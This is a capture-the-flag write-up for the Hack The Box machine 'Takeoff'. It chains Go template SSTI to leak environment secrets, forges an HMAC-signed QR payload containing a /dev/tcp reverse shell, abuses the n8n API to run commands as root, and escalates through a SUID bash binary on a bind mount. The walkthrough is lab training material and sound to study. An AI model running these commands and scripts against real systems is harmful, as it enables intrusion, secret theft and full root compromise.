# Takeoff HTB Machine Writeup

**Difficulty:** Hard

Starting with an IP, we need to do active recon and scan for open ports using nmap:

```bash
nmap -sC -sV -p- 10.129.22.134
```

Open ports:

```text
22  - OpenSSH 8.9
80  - nginx / Go Echo application
```

Port 80 is running an airline booking application called HTB Airways Booking.

After registering and booking a ticket, we can access a check-in page that generates a QR code.

We will come back to that QR code later.

## Go Template SSTI

While exploring the application, we find that we can add notes when booking a ticket. These notes are included in the PDF boarding pass generated by the server.

After testing the notes functionality, we discover that the application uses Go templates to render the PDF and does not properly sanitize user input.

So naturally, we try SSTI.

The template context exposes a `.File` method that allows us to read files from the server. Therefore, we can use it to read `/proc/self/environ`, which contains the environment variables of the running process.

```go
{{ .File "/proc/self/environ" }}
```

We put this inside the notes field, generate the boarding pass, and download the PDF.

And yeah, the server literally prints its environment variables inside our PDF.

Among the leaked variables, we find:

```text
TICKET_VALIDATION_TOKEN=JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR
N8N_API_KEY=eyJhbGciOiJIUzI1NiIs...
```

The first one is the HMAC signing key used to validate ticket QR codes, and the second one is an API key for n8n.

We will use both of these later.

## QR Code Forgery

Now that we have the HMAC key, we can take another look at the QR code generated by the application.

The QR code is not just random data. It contains a serialized Go structure using the `gob` format, followed by a 32-byte HMAC-SHA256 signature.

The structure looks like this:

```text
[ gob_bytes ][ 32-byte HMAC-SHA256 signature ]
```

The last 32 bytes are the signature, while everything before that is the actual serialized data.

Normally, modifying anything inside the payload would invalidate the signature, since the application verifies it using the secret key.

However, we already have that key, meaning we can generate valid signatures ourselves.

After inspecting the gob payload, we find a struct called `VerifyTicketAuthenticity`, which contains a `Data` field holding a JSON object.

Inside that JSON object, we find `NotifyCmd`, which contains a command that gets executed when the ticket is checked in.

So basically, the application executes a command from the QR code. Interesting design choice.

Our goal is to replace the original `NotifyCmd` with a reverse shell command.

One important detail is that Go gob strings have length information associated with them. If we replace the original string with something longer or shorter without updating its length prefix, the serialized data will become invalid.

Instead of rebuilding the entire gob structure, we can simply pad our reverse shell command with spaces until it has exactly the same length as the original command.

This allows us to replace the command without modifying the original string length.

After that, we calculate a new HMAC signature using the leaked key and append it to the modified payload.

The following script automates the process:

```python
import base64, hmac, hashlib, re, html, requests

KEY = b'JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR'
COOKIE = "YOUR_SESSION_TOKEN"

# Grab the legitimate QR code
t = requests.get(
    "http://takeoff.htb/check-in",
    cookies={"session_token": COOKIE}
).text

qr_b64 = html.unescape(
    re.search(r'name="qr_data"\s+value="([^"]+)"', t).group(1)
)

raw = base64.b64decode(qr_b64)
gob, sig = raw[:-32], raw[-32:]

# Verify the HMAC key
assert hmac.new(KEY, gob, hashlib.sha256).digest() == sig

# Find the NotifyCmd field
marker = b'"NotifyCmd":"'
idx = gob.find(marker)
start = idx + len(marker)
end = gob.find(b'"', start)

orig = gob[start:end]

# Reverse shell command
cmd = b'bash -i >& /dev/tcp/10.10.14.167/4444 0>&1'

# Pad the command to match the original length
cmd = cmd + b' ' * (len(orig) - len(cmd))

# Replace the original command
forged = gob[:start] + cmd + gob[end:]

# Generate a new HMAC signature
new_sig = hmac.new(KEY, forged, hashlib.sha256).digest()

payload = base64.b64encode(forged + new_sig).decode()

# Send the modified QR code
r = requests.post(
    "http://takeoff.htb/api/check-in",
    data={"qr_data": payload, "gate": "WEB"},
    allow_redirects=False
)
```

We start a listener on our attacking machine:

```bash
nc -lvnp 4444
```

And send the forged QR code to the check-in endpoint.

The endpoint does not require authentication, so we can submit our modified QR code directly.

After the command executes, we receive a reverse shell as `www-data`.

```bash
id
```

Now we have initial access to the machine.

## n8n API Abuse

Remember the n8n API key we found earlier?

Further enumeration reveals that n8n is running internally on port `5678` inside a Docker container.

The service is running as root inside the container, and we already have a valid API key.

n8n is a workflow automation platform that allows users to create workflows using different nodes. One of these nodes is `Execute Command`, which allows commands to be executed on the system.

So what we can do is create a workflow containing a webhook connected to an Execute Command node.

Whenever we trigger the webhook, the command inside the node will execute.

First, we create the workflow using the API:

```bash
N8N_KEY="eyJhbGciOiJIUzI1NiIs..."

curl -s -X POST \
  -H "X-N8N-API-KEY: $N8N_KEY" \
  -H "Content-Type: application/json" \
  http://127.0.0.1:5678/api/v1/workflows \
  -d '{
    "name": "rce",
    "nodes": [
      {
        "parameters": {
          "httpMethod": "POST",
          "path": "rce",
          "responseMode": "onReceived"
        },
        "id": "wh1",
        "name": "Webhook",
        "type": "n8n-nodes-base.webhook",
        "typeVersion": 1,
        "position": [0,300],
        "webhookId": "rce-trigger"
      },
      {
        "parameters": {
          "command": "COMMAND_HERE"
        },
        "id": "exec1",
        "name": "Execute Command",
        "type": "n8n-nodes-base.executeCommand",
        "typeVersion": 1,
        "position": [200,300]
      }
    ],
    "connections": {
      "Webhook": {
        "main": [[
          {
            "node": "Execute Command",
            "type": "main",
            "index": 0
          }
        ]]
      }
    },
    "settings": {}
  }'
```

After creating the workflow, we activate it:

```bash
curl -s -X POST \
  -H "X-N8N-API-KEY: $N8N_KEY" \
  http://127.0.0.1:5678/api/v1/workflows/$WORKFLOW_ID/activate
```

And trigger it:

```bash
curl -s -X POST http://127.0.0.1:5678/webhook/rce
```

Now we can execute commands as root inside the Docker container.

## User Flag (kpark)

Further enumeration reveals something interesting about the Docker container.

Its `/root` directory is actually bind-mounted to the host's `/home/kpark`.

Meaning that anything we write inside `/root` in the container will also appear inside `/home/kpark` on the actual host.

So we can use this to create an SSH key for the user `kpark` and log in through SSH.

One important detail is that files created by root inside the container will be owned by UID 0.

However, the host user `kpark` has UID 1001, and SSH checks the ownership and permissions of the `authorized_keys` file.

Therefore, we need to change the ownership to UID 1001.

Using the n8n Execute Command node, we run:

```bash
mkdir -p /root/.ssh

echo "ssh-ed25519 AAAA... nabil@fedora" \
  > /root/.ssh/authorized_keys

chown -R 1001:1001 /root/.ssh

chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
```

Now we can SSH into the machine as `kpark`:

```bash
ssh -i ~/.ssh/id_ed25519 kpark@10.129.22.134
```

And get the user flag:

```bash
cat /home/kpark/user.txt
```

## Privilege Escalation to Root

Now that we have access as `kpark`, we can abuse the same bind mount to get root on the actual host.

Remember that the container's `/root` is mounted to `/home/kpark` on the host.

We also discover that the bind mount was not configured with the `nosuid` option.

This means that SUID permissions are honored on files inside that mounted directory.

So the idea is to copy `/bin/bash` into `kpark`'s home directory, change its ownership to root from inside the container, and set the SUID bit.

First, as `kpark` on the host, we copy bash:

```bash
cp /bin/bash /home/kpark/pwnbash
```

Now, using the n8n Execute Command node, we change the ownership and permissions:

```bash
chown root:root /root/pwnbash
chmod 4755 /root/pwnbash
```

The `4` in `4755` represents the SUID bit, meaning that the binary will execute with the privileges of its owner.

Since we changed the owner to root, executing this binary with the appropriate options will give us a root shell.

Back as `kpark`, we run:

```bash
/home/kpark/pwnbash -p
```

The `-p` option tells Bash to preserve its elevated privileges instead of dropping them.

Let's verify:

```bash
id

uid=0(root) gid=0(root)
```

And we are root.

Finally, we can grab the root flag:

```bash
cat /root/root.txt
```

and boom, machine completed.
